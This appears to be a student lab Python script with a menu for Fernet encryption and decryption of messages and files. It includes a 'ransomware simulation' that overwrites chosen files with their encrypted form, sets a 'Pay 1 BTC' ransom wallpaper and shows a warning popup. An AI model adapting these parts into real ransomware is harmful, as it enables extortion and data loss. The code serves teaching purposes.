#!/usr/bin/env python3
# Import libraries
from cryptography.fernet import Fernet
import os, time, math
import ctypes  # For changing wallpaper
import tkinter as tk  # For popup window
from tkinter import messagebox  # For message box

# Declare variables
user_name = os.path.expanduser("~")
ransom_path = f"{user_name}/OneDrive/Desktop/lab8folder"  # Test path

# Declare functions
def write_key():
    """
    Generates a key and saves it into a file
    """
    key = Fernet.generate_key()
    with open("key.key", "wb") as key_file:
        key_file.write(key)
    return key

def load_key():
    """
    Loads the key from the `key.key` file
    """
    return open("key.key", "rb").read()

def if_key():
    """
    Checks if the key exists, generates if not, and returns Fernet instance
    """
    if not os.path.exists("key.key"):
        key = write_key()
    else:
        key = load_key()
    return Fernet(key)

def encrypt_message():
    """
    Encrypts a user-provided message
    """
    f = if_key()
    message = input("Enter message to encrypt: ").encode()
    encrypted = f.encrypt(message)
    print("Encrypted message:", encrypted.decode())

def decrypt_message():
    """
    Decrypts a user-provided encrypted message
    """
    f = if_key()
    message = input("Enter message to decrypt: ").encode()
    decrypted = f.decrypt(message)
    print("Decrypted message:", decrypted.decode())

def encrypt_file():
    """
    Encrypts a file specified by the user
    """
    f = if_key()
    filename = input("Enter filepath to encrypt: ")
    with open(filename, "rb") as file:
        file_data = file.read()
    encrypted_data = f.encrypt(file_data)
    with open(filename, "wb") as file:
        file.write(encrypted_data)
    print("File encrypted successfully.")

def decrypt_file():
    """
    Decrypts a file specified by the user
    """
    f = if_key()
    filename = input("Enter filepath to decrypt: ")
    with open(filename, "rb") as file:
        encrypted_data = file.read()
    try:
        decrypted_data = f.decrypt(encrypted_data)
        with open(filename, "wb") as file:
            file.write(decrypted_data)
        print("File decrypted successfully.")
    except:
        print("Error: Invalid key or file may already be decrypted.")

def change_wallpaper():
    """
    Changes the desktop wallpaper to a ransomware message (Windows only)
    """
    try:
        # Path to a temporary image file we'll create
        image_path = os.path.join(os.getenv('TEMP'), 'ransom_wallpaper.bmp')
        
        # Create a simple image with the ransom message
        from PIL import Image, ImageDraw, ImageFont
        img = Image.new('RGB', (800, 600), color='black')
        d = ImageDraw.Draw(img)
        
        try:
            font = ImageFont.truetype("arial.ttf", 30)
        except:
            font = ImageFont.load_default()
            
        d.text((100, 250), "YOUR FILES HAVE BEEN ENCRYPTED!\n\nPay 1 BTC to get them back.", 
               fill="red", font=font)
        img.save(image_path)
        
        # Set the wallpaper
        ctypes.windll.user32.SystemParametersInfoW(20, 0, image_path, 3)
        print("Wallpaper changed with ransom message.")
    except Exception as e:
        print(f"Error changing wallpaper: {e}")

def show_popup():
    """
    Shows a ransomware popup message (Windows only)
    """
    try:
        root = tk.Tk()
        root.withdraw()  # Hide the main window
        
        # Create a custom message box
        messagebox.showwarning(
            "RANSOMWARE SIMULATION",
            "Your files have been encrypted!\n\n"
            "This is a simulation for educational purposes only.\n"
            "To decrypt your files, you would need to pay the ransom.\n\n"
            "DO NOT PAY IN A REAL ATTACK - CONTACT AUTHORITIES INSTEAD.",
            icon='warning'
        )
        print("Ransomware popup displayed.")
    except Exception as e:
        print(f"Error showing popup: {e}")

def ransomware_simulation():
    """
    Runs the ransomware simulation (wallpaper change + popup)
    """
    print("\n=== RUNNING RANSOMWARE SIMULATION ===")
    print("This will change your wallpaper and show a popup message.")
    confirm = input("Are you sure you want to continue? (yes/no): ").lower()
    
    if confirm == 'yes':
        try:
            change_wallpaper()
            show_popup()
            print("Simulation complete. Your system appears compromised.")
        except:
            print("Simulation failed. This might not be a Windows system.")
    else:
        print("Simulation cancelled.")

# Menu for user interaction
def ask_user():
    mode = input("\nWhat would you like to do?\n"
                 "1 - Encrypt a message\n"
                 "2 - Decrypt a message\n"
                 "3 - Encrypt a file\n"
                 "4 - Decrypt a file\n"
                 "5 - Run ransomware simulation\n"
                 "6 - Exit\n"
                 "Enter a number: ")
    
    if mode == "1":
        encrypt_message()
    elif mode == "2":
        decrypt_message()
    elif mode == "3":
        encrypt_file()
    elif mode == "4":
        decrypt_file()
    elif mode == "5":
        ransomware_simulation()
    elif mode == "6":
        print("Goodbye!")
        exit()
    else:
        print("Invalid selection.")

# Main loop
while True:
    ask_user()

    